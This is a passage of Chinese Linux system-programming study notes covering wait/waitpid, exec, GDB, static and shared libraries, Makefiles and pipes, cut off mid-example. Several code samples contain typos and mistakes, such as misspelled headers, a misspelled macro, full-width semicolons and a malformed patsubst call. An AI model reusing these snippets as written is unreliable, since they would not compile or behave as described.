class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line">pid_t wait(int *status);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要功能：回收已经结束子进程的资源</p><p><strong>宏函数</strong><br><img src="/2024/03/13/Linux/1686303048890-40005cf4-8498-421b-ab8a-bc645eb84c27.png" alt="image.png"></p><p>wait()</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unisd.h&gt;</span></span><br><span class="line">int main()</span><br><span class="line">&#123;   int status = 0;</span><br><span class="line">    pid_t pid = fork();//创建子进程</span><br><span class="line">    if(pid == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      for(int i=0;i&lt;5;i++)</span><br><span class="line">      &#123;</span><br><span class="line">       printf(<span class="string">&quot;child process do thing %d\n&quot;</span>,i+1);</span><br><span class="line">       sleep(1);</span><br><span class="line">      &#125;</span><br><span class="line">      exit(10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //父进程执行</span><br><span class="line">    printf(<span class="string">&quot;父进程等待子进程退出，回收其资源&quot;</span>);</span><br><span class="line">    //父进程阻塞，等待子进程退出</span><br><span class="line">    int ret = wait(&amp;status);</span><br><span class="line">    if(ret == -1)</span><br><span class="line">    &#123;</span><br><span class="line">     perror(<span class="string">&quot;wait&quot;</span>);</span><br><span class="line">     return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;父进程回收了子进程的资源&quot;</span>);</span><br><span class="line"></span><br><span class="line">    //属于正常退出</span><br><span class="line">    if(WIFEXITED(status))</span><br><span class="line">    &#123;</span><br><span class="line">     printf(<span class="string">&quot;子进程退出状态码：%d\n&quot;</span>,WEXITSTATUS(status));</span><br><span class="line">    &#125;<span class="keyword">else</span> if(WIFSGNALED(status))</span><br><span class="line">    &#123;</span><br><span class="line">     printf(<span class="string">&quot;子进程被信号%d杀死了\n&quot;</span>,WTERMSIG(status));</span><br><span class="line">    &#125;<span class="keyword">else</span> if(WIFSTOPPED(status))</span><br><span class="line">    &#123;</span><br><span class="line">     printf(<span class="string">&quot;子进程被信号%d暂停\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>waitpid()函数</strong><br><img src="/2024/03/13/Linux/1686304121291-bd4fcf94-de0a-49c8-8096-c4927d904c33.png" alt="image.png"></p><p><strong>孤儿进程</strong><br><img src="/2024/03/13/Linux/1686304539430-71f5e151-9d58-435b-adba-055e4df52553.png" alt="image.png"></p><p><strong>僵尸进程</strong><br><img src="/2024/03/13/Linux/1686304647312-98a091b0-10dc-4cfc-be89-007e27ccf033.png" alt="image.png"></p><p><strong>进程替换</strong><br>execlp()</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> printf(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"> //arg0,arg1,arg2....argn</span><br><span class="line"> //arg0一般是可执行文件名，argn必须是NULL</span><br><span class="line"> //等价于ls -l /home</span><br><span class="line"> execlp(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;/home&quot;</span>,NULL);</span><br><span class="line"></span><br><span class="line"> printf(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"> return 0；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>execl()</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> printf(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"> //arg0,arg1,arg2....argn</span><br><span class="line"> //arg0一般是可执行文件的绝对或者相对路径，argn必须是NULL</span><br><span class="line"> //等价于ls -l /home</span><br><span class="line"> execlp(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;/home&quot;</span>,NULL);</span><br><span class="line"></span><br><span class="line"> printf(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"> return 0；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/Linux/1686306770054-9967b6ab-fb6f-412e-b90a-9fffe150e57b.png" alt="image.png"></p><p><strong>在原进程中，如果exclp()执行成功，那么原来的进程就会被ls可执行文件整个替换，并从ls的main()函数开始执行，所以原进程中的printf(“hello”)已经被替换了，不会执行</strong><br>GDB调试器<strong>该程序是一个交互式工具，工作在字符模式除gdb外，linux下还有xxgdb，ddd，kgdb，ups等调试器</strong><br><strong>​</strong><br><strong>GCB主要功能：</strong><br><strong>1.启动程序，可以按照自定义要求随心所欲的运行程序</strong><br><strong>2.可以被调试的程序在你所指定的调置的断点处停住</strong><br><strong>3.当程序被停住时，可以检查此时你的程序中所发生的事</strong><br><strong>4.动态的改变你程序的执行环境</strong><br><strong>​</strong><br><strong>生成调试信息</strong><br><strong>在编译时，使用-g参数</strong><br><strong>gcc&#x2F;g++ -g 1.c -o 1</strong><br><strong>​</strong><br><strong>启动GDB</strong><br><strong>gdb program（执行文件）</strong><br><strong>设置运行参数 **<br><strong>set args 可指定运行时参数(如set args 10,20…)</strong><br><strong>show args   &#x2F;&#x2F;可以查看设置好的运行参数</strong><br><strong>启动程序</strong><br><strong>run  &#x2F;&#x2F;程序开始执行，如果有断点，停在第一个断点处</strong><br><strong>start &#x2F;&#x2F;程序向下执行一行</strong><br><strong>显示源代码</strong><br><strong>list linenum 打印第lineum行的上下文内容</strong><br><strong>list function 显示函数名为function的函数的源程序</strong><br><strong>list: 显示当前行后面的源程序</strong><br><strong>list-: 显示当前行前面的源程序</strong><br><strong>断点操作</strong><br><strong>break 设置断点，可以简写为b</strong><br><strong>b 10 设置断点，在源程序第10行</strong><br><strong>b func 设置断点，在func函数入口处</strong><br><strong>​</strong><br><strong>查询断点</strong><br><strong>info break</strong><br><strong>i b</strong><br><strong>i break</strong><br><strong>info b</strong><br><strong>​</strong><br><strong>多文件设置断点</strong><br><strong>break filename:lineum  –在源文件filename的lineum行处停住</strong><br><strong>break filename:function –在源文件filename的function函数的入口处停住</strong><br><strong>break class::function或function(type,type)  – 在类class的funtion函数的入口停住</strong><br><strong>break namespace::class::function –  在名称空间为namespace的类class的function函数的入口处停住</strong><br><strong>​</strong><br><strong>条件断点</strong><br><strong>break test.c:23 if i&#x3D;&#x3D;5</strong><br><strong>​</strong><br><strong>维护断点</strong><br><strong>delete break   删除断点</strong><br><strong>disable break  禁用断点</strong><br><strong>enable break   启用断点</strong><br><strong>​</strong><br><strong>调试代码</strong><br><strong>run <strong><strong>运行程序简写r</strong><br><strong>next <strong><strong>单步跟踪，函数调用当做一条简单语句执行，简写n</strong><br><strong>step</strong></strong> 单步跟踪，函数调用进入被调用函数体内，简写s</strong><br><strong>finish</strong></strong> 退出进入的函数</strong><br><strong>until</strong></strong> 在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体，简写u**<br><strong>continue <strong><strong>继续运行程序，停在下一个短点的位置，简写c</strong><br><strong>quit</strong></strong> 退出gdb，简写q</strong><br><strong>​</strong><br><strong>数据查看</strong><br><strong>查看运行时数据print 简写p</strong><br><strong>​</strong><br><strong>自动显示</strong><br><strong>可以设置一些自动显示的变量</strong><br><strong>display 变量名</strong><br><strong>info display 查看display设置的自动显示的信息</strong><br><strong>undisplay  num</strong><br><strong>delete display dnums 删除自动显示</strong><br><strong>disable display dnums</strong><br><strong>enable display dnums</strong><br><strong>​</strong><br>linux中静态库的制作(.c .h)  编译时加载前缀：lib<br>后缀：.a<br><strong>将.c文件通过gcc命令生成.o文件之后（gcc -c 1.c -o 1.o）</strong><br><strong>使用ar命令</strong><br><strong>ar -rcs libtest.a  1.o 2.o 3.o 4.o</strong><br>linux中动态库的制作  运行时加载<br><strong>前缀：lib</strong><br><strong>后缀：.so</strong><br><strong>libxxx.so</strong><br><strong>动态库的制作：</strong><br><strong>步骤一：生成目标文件，编译时选项 -fpic</strong><br><strong>gcc -fpic -c 1.c</strong><br><strong>gcc -fpic -c 2.c</strong><br><strong>步骤二：生成共享库，链接选项-shared</strong><br><strong>gcc -shared 1.o 2.o -o libtest.so</strong><br><strong>步骤三：通过nm命令查看对应的函数</strong><br><strong>动态库的使用</strong></p><p>makefile<strong>一个工程中的源文件不计其数，其按类型，功能，模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，那些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，因为Makefile就像shell脚本一样，其中也可以执行操作系统的命令</strong><br><strong>Makefile带来的好处就是——自动化编译</strong><br><strong>主要解决两个问题：</strong><br><strong>1）大量代码的关系维护</strong><br><strong>2) 减少重复编译时间</strong><br><strong>​</strong><br><strong>make工具安装linux</strong><br><strong>sudo apt install make</strong><br><strong>​</strong><br><strong>Makefile语法规则</strong><br><strong>一条规则</strong><br><strong>目标：依赖文件列表</strong><br><strong><tab>命令列表</tab></strong><br><strong>all:test</strong><br><strong>echo “hello world”</strong></p><p><strong>Makefile基本规则三要素：</strong><br><strong>1.目标：</strong><br>**   通常是要产生的文件名称，目标可以是可执行文件或其他obj文件，也可以是一个动作名称**<br><strong>2.依赖文件：</strong><br>**   用来谁从而产生目标的文件**<br>**   一个目标通常有几个依赖文件**<br><strong>3.命令</strong><br>**   make执行的动作，一个规则可以含几个命令**<br>**   有多个命令时，每个命令占一行**<br><strong>​</strong><br><strong>make命令格式</strong><br><strong>make [-f file][option][targets]</strong><br><strong>option:</strong><br><strong>-v  显示make工具的版本信息</strong><br><strong>-w 在处理Makefile之前和之后的工作路径</strong><br><strong>-C dir 读取Makefile之前改变工作路径至dir目录</strong><br><strong>-n 只打印要执行的命令但不执行</strong><br><strong>-s 执行但不显示执行的命令</strong><br><strong>​</strong><br><strong>targets:</strong><br><strong>若指定make命令时没有指定目标，则make工具默认是文件得第一个目标</strong><br><strong>​</strong><br><strong>案例：</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">test：1.c 2.c 3.c 4.c </span><br><span class="line">     gcc 1.c 2.c 3.c 4.c  -o test</span><br><span class="line"></span><br><span class="line"><span class="section">test:1.o 2.o 3.o 4.o 5.o</span></span><br><span class="line">gcc 1.o 2.o 3.o 4.o 5.o -o test</span><br><span class="line"></span><br><span class="line"> 1.o:1.c</span><br><span class="line">     gcc -c 1.c -o 1.o</span><br><span class="line"></span><br><span class="line"> 2.o:2.c</span><br><span class="line">     gcc -c 2.c -o 2.o</span><br><span class="line"></span><br><span class="line"> 3.o:3.c</span><br><span class="line">     gcc -c 3.c -o 3.o</span><br><span class="line"></span><br><span class="line"> 4.o:4.c</span><br><span class="line">     gcc -c 4.c -o 4.o</span><br><span class="line"></span><br><span class="line"> 5.o:5.c</span><br><span class="line">     gcc -c 5.c -o 5.o</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     </span><br></pre></td></tr></table></figure><p><strong>自定义变量</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">OBJS = 1.O 2.O 3.O 4.O 5.O</span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$(OBJS)</span> -o test</span><br><span class="line"></span><br><span class="line">  1.o:1.c</span><br><span class="line">     gcc -c 1.c -o 1.o</span><br><span class="line"></span><br><span class="line"> 2.o:2.c</span><br><span class="line">     gcc -c 2.c -o 2.o</span><br><span class="line"></span><br><span class="line"> 3.o:3.c</span><br><span class="line">     gcc -c 3.c -o 3.o</span><br><span class="line"></span><br><span class="line"> 4.o:4.c</span><br><span class="line">     gcc -c 4.c -o 4.o</span><br><span class="line"></span><br><span class="line"> 5.o:5.c</span><br><span class="line">     gcc -c 5.c -o 5.o</span><br></pre></td></tr></table></figure><p><strong>三个自动变量</strong><br><strong>$@ 表示目标</strong><br><strong>$^ 表示所有依赖</strong><br><strong>$&lt; 表示第一个依赖</strong><br><strong>​</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">OBJS = 1.O 2.O 3.O 4.O 5.O</span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line">  1.o:1.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> 2.o:2.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> 3.o:3.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> 4.o:4.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> 5.o:5.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p><strong>模式匹配 所用的.o都依赖于对应的.c</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OBJS = 1.O 2.O 3.O 4.O 5.O</span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> %.o:%.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p><strong>Makefile中的函数</strong><br><strong>1.wildcard 查找指定目录下的指定类型的文件</strong><br>*<em>src &#x3D; $(wildcard <em>.c )  找到当前目录下所有后缀为.c的文件赋值给src</em></em><br><strong>2.patsubst 匹配替换</strong><br><strong>obj &#x3D; $(patsubst %.c %.o ,$(src))  把src变量里所有后缀为.c的文件名替换成.o</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c )</span></span><br><span class="line">OBJS  = <span class="variable">$(<span class="built_in">patsubst</span> %.c %.o ,<span class="variable">$(src)</span>)</span> </span><br><span class="line"></span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> %.o:%.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p><strong>Makefile中的伪目标</strong><br><strong>.PHONY:clean</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c )</span></span><br><span class="line">OBJS  = <span class="variable">$(<span class="built_in">patsubst</span> %.c %.o ,<span class="variable">$(src)</span>)</span> </span><br><span class="line"></span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> %.o:%.c</span><br><span class="line">     gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#声明clean为伪目标，伪目标不去判断目标文件是否存在或者已经更新</span></span><br><span class="line"> <span class="comment">#无条件执行命令</span></span><br><span class="line"> .PHONY:clean</span><br><span class="line"> clean:</span><br><span class="line">     rm -rf <span class="variable">$(OBJS)</span> test</span><br></pre></td></tr></table></figure><p><strong>特殊符号：</strong><br><strong>“-“  此命令出错make也会执行后续操作</strong><br><strong>“@” 不显示命令本身,只显示结果</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c )</span></span><br><span class="line">OBJS  = <span class="variable">$(<span class="built_in">patsubst</span> %.c %.o ,<span class="variable">$(src)</span>)</span> </span><br><span class="line"></span><br><span class="line"><span class="section">test:<span class="variable">$(OBJS)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> %.o:%.c</span><br><span class="line">     @gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#声明clean为伪目标，伪目标不去判断目标文件是否存在或者已经更新</span></span><br><span class="line"> <span class="comment">#无条件执行命令</span></span><br><span class="line"> .PHONY:clean</span><br><span class="line"> clean:</span><br><span class="line">     -rm -rf <span class="variable">$(OBJS)</span> test</span><br></pre></td></tr></table></figure><p>进程之间的通信进程是一个独立的组员分配单位，不同进程之间的资源是独立的，没有关联，不能在一个进程中直接访问另一个进程的资源<br>​<br><img src="/2024/03/13/Linux/1686307776228-3e0983c3-661c-4e0f-8de5-3ccbdf62c150.png" alt="image.png"></p><p><strong>无名管道</strong><br><strong>管道也叫无名管道，他是unix系统ipc（进程间通信）的最古老形式，所有的unix系统都支持这种通信机制</strong><br><strong>管道有如下特点：</strong><br><strong>1）半双工，数据在同一时刻只能在一个方向上流动</strong><br><strong>2）数据只能从管道的一端写入，从另一端读出</strong><br><strong>3）写入管道中的数据遵循先入先出的规则</strong><br><strong>4）管道所传送的数据是无格式的，这要求管道的读出方式与写入方必须事先约定好数据的格式，如多少字节算一个消息等</strong><br><strong>5）管道不是普通的文件，不属于某个文件系统，其只存在于内存中</strong><br><strong>6）管道在内存中对应一个缓冲区，不同的系统其大小不一定相同</strong><br><strong>7）从管道读取数据是一次性操作，数据一旦被读走，它就从管道中被抛弃，释放空间以便写更多数据</strong><br><strong>8）管道没有名字，只能在具有公共祖先的进程之间使用</strong><br><strong>对于管道特点的理解，我们可以类比现实生活中管子，管子的一端塞东西，另一端取东西</strong><br><strong>​</strong><br><strong>PIPE 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span></span>; <span class="comment">//创建无名管道</span></span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/Linux/1686308893519-b226bd52-a648-4f32-bb3d-f732875ecf93.png" alt="image.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sting.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">pipe</span>(fds);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fds[0]用于读，fds[1]用于写</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fds[0]:%d fds[1]:%d\n&quot;</span>,fds[<span class="number">0</span>],fds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭文件描述符</span></span><br><span class="line">    <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>父子进程通过无名管道通信</strong><br><strong>和文件的读写相似（<strong><strong>即使子进程先执行也会被管道阻塞等待父进程执行之后再执行读操作</strong></strong>）</strong><br><strong>设置非阻塞属性</strong><br><img src="/2024/03/13/Linux/1686367661535-3265a312-486e-4c8d-98de-5da574f5a05a.png" alt="image.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  SIZE 64</span></span><br><span class="line"><span class="comment">//父子进程使用无名管道进行通信</span></span><br><span class="line"><span class="comment">//父进程写管道，子进程读管道</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="type">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span>  buf[SIZE];</span><br><span class="line">    <span class="type">pid_t</span>  pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//创建无名管道</span></span><br><span class="line">    ret = <span class="built_in">pipe</span>(fds);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建子进程</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//子进程</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//关闭写端</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span 